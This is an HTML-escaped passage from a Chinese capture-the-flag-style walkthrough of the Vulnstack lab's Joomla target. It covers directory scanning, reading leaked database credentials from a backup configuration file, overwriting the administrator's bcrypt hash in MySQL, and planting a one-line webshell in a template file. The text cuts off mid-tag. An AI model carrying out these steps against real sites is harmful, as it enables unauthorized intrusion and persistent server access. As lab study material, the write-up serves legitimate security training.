class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  316B  - /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/                                              \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/                                                                              \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  318B  - /cache  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/cache/                                          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /cache/                                                                            \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /cli/                        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  323B  - /components  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/components/\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /components/                                       \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /configuration.php           \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    2KB - /configuration.php~          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    1KB - /htaccess.txt                \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  319B  - /images  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/images/\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /images/                                                                           \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  321B  - /includes  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/includes/                                                                                                                                         \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /includes/                                     \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    4KB - /index.php           \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    3KB - /index.php/login/                                                                  \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  321B  - /language  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/language/                                    \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /layouts/                                                                          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  322B  - /libraries  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/libraries/                                  \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /libraries/                                                                        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    7KB - /LICENSE.txt                                                                       \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  318B  - /media  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/media/                                          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /media/                                                                            \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  320B  - /modules  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/modules/                                      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /modules/                                                                          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:05] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  320B  - /plugins  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/plugins/                                      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:05] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /plugins/                                                                          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:07] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    2KB - /README.txt                                                                        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:08] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  392B  - /robots.txt                                                                        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  322B  - /templates  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/templates/                                  \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /templates/                                                                        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /templates/index.html                                                              \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /templates/beez3/                                                                  \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /templates/protostar/        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /templates/system/                                 \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  316B  - /tmp  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.213\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e/tmp/              \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   31B  - /tmp/                        \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  628B  - /web.config.txt         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e1.php\u003c/code\u003e 是\u003ccode\u003ephpinfo\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/administrator\u003c/code\u003e 登陆页面\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/configuration.php~\u003c/code\u003e \u003ccode\u003eJoomle\u003c/code\u003e的配置文件\u003c/p\u003e\n\u003cp\u003e嗯？还有回显，访问得到如下信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eè¯·ç¨å€™è®¿é—®ã€‚\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $display_offline_message = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $offline_image = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $sitename = '\u003c/span\u003etest\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $editor = '\u003c/span\u003etinymce\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $captcha = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $list_limit = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $access = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $debug = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $debug_lang = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $debug_lang_const = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $dbtype = '\u003c/span\u003emysqli\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $host = '\u003c/span\u003elocalhost\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $user = '\u003c/span\u003etestuse\u003cspan class=\"hljs-string\"\u003er';\n\tpublic $password = '\u003c/span\u003ecvcvgjASD!@\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $db = '\u003c/span\u003ejoomla\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $dbprefix = '\u003c/span\u003eam2zu_\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $live_site = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $secret = '\u003c/span\u003egXN9Wbpk7ef3A4Ys\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $gzip = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $error_reporting = '\u003c/span\u003edefault\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $helpurl = '\u003c/span\u003ehttps://\u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}\u0026#x26;lang={langcode}\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $ftp_host = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $ftp_port = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $ftp_user = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $ftp_pass = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $ftp_root = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $ftp_enable = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $offset = '\u003c/span\u003eUTC\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $mailonline = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $mailer = '\u003c/span\u003email\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $mailfrom = '\u003c/span\u003etest@test.com\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $fromname = '\u003c/span\u003etest\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $sendmail = '\u003c/span\u003e/usr/sbin/sendmail\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $smtpauth = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $smtpuser = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $smtppass = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $smtphost = '\u003c/span\u003elocalhost\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $smtpsecure = '\u003c/span\u003enone\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $smtpport = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $caching = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $cache_handler = '\u003c/span\u003efile\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $cachetime = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $cache_platformprefix = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $MetaDesc = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $MetaKeys = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $MetaTitle = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $MetaAuthor = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $MetaVersion = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $robots = '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $sef = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $sef_rewrite = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $sef_suffix = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $unicodeslugs = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $feed_limit = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $feed_email = '\u003c/span\u003enone\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $log_path = '\u003c/span\u003e/var/www/html/administrator/logs\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $tmp_path = '\u003c/span\u003e/var/www/html/tmp\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $lifetime = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $session_handler = '\u003c/span\u003edatabase\u003cspan class=\"hljs-string\"\u003e';\n\tpublic $shared_session = '\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e';\n}\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到了数据库账号\u003ccode\u003etestuser\u003c/code\u003e密码\u003ccode\u003ecvcvgjASD!@\u003c/code\u003e ，以及网站的根目录\u003ccode\u003e/var/www/html/\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试登录MYSQL，使用\u003ccode\u003eNavicat\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image40.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登陆成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进入数据库后台后，查找敏感数据\u003c/p\u003e\n\u003cp\u003e找到后台管理员的数据，在\u003ccode\u003eam2zu_users\u003c/code\u003e 表下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-number\"\u003e891\u003c/span\u003e\tSuper User\tadministrator\ttest@test.com\t$2y$\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试使用\u003ccode\u003ejohn\u003c/code\u003e破解，但是无果，尝试修改\u003ccode\u003eMYSQL\u003c/code\u003e表文件\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e将得到的后台管理员密码拿去识别得知是\u003cstrong\u003eBcrypt\u003c/strong\u003e加密，是为了抗爆发明的，所以john破解无果（太慢了）\u003c/p\u003e\n\u003cp\u003e我们将123456进行\u003cstrong\u003eBcrypt\u003c/strong\u003e加密，得到\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e加密网站：\u003ca href=\"https://www.bejson.com/encrypt/bcrpyt_encode/\"\u003ehttps://www.bejson.com/encrypt/bcrpyt_encode/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$2a$\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e$JYEZiw0pCY1NV9ZVsaJ39uAgaXUpzCvaFxvBDPwMBlQEkYmD7RXPi\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后将其替换到\u003ccode\u003eadministrator\u003c/code\u003e上去，登陆后台，成功进入后台\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用账号\u003ccode\u003eadministrator\u003c/code\u003e密码\u003ccode\u003e123456\u003c/code\u003e登录后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image41.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获取到系统信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eSetting \tValue\nPHP Built On \tLinux ubuntu \u003cspan class=\"hljs-number\"\u003e4.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e142\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64\u003c/span\u003e\nDatabase \u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e \tmysql\nDatabase Version \t\u003cspan class=\"hljs-number\"\u003e5.7\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.27\u003c/span\u003e-0ubuntu0\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.04\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nDatabase Collation \tutf8_general_ci\nDatabase Connection Collation \tutf8mb4_general_ci\nPHP Version \t\u003cspan class=\"hljs-number\"\u003e7.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.32\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e+ubuntu16\u003cspan class=\"hljs-number\"\u003e.04\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e+deb.sury.org+\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nWeb Server \tApache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.18\u003c/span\u003e (Ubuntu)\nWebServer to PHP Interface \tapache2handler\nJoomla! Version \tJoomla! \u003cspan class=\"hljs-number\"\u003e3.9\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e Stable [ Amani ] \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e-September-\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e GMT\nJoomla! Platform Version \tJoomla Platform \u003cspan class=\"hljs-number\"\u003e13.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e Stable [ Curiosity ] \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e-Apr-\u003cspan class=\"hljs-number\"\u003e2013\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e GMT\nUser Agent \tMozilla/\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e (Windows NT \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e; Win64; x64; rv:\u003cspan class=\"hljs-number\"\u003e132.0\u003c/span\u003e) Gecko/\u003cspan class=\"hljs-number\"\u003e20100101\u003c/span\u003e Firefox/\u003cspan class=\"hljs-number\"\u003e132.0\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过模板\u003ccode\u003egetshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e修改模板\u003ccode\u003eExtensions\u003c/code\u003e–\u003e\u003ccode\u003eTemplates\u003c/code\u003e–\u003e\u003ccode\u003eTemplates\u003c/code\u003e–\u003e\u003ccode\u003eBeez3 Details and Files\u003c/code\u003e 的\u003ccode\u003eerror.php\u003c/code\u003e文件，将内容替换为一句木马\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image42.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e访问\u003ccode\u003eerror.php\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e/templates/beez3/error.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用蚁🗡连接，连接成功\u003c/p\u003e\n\u003cp\u003e\u003cimg 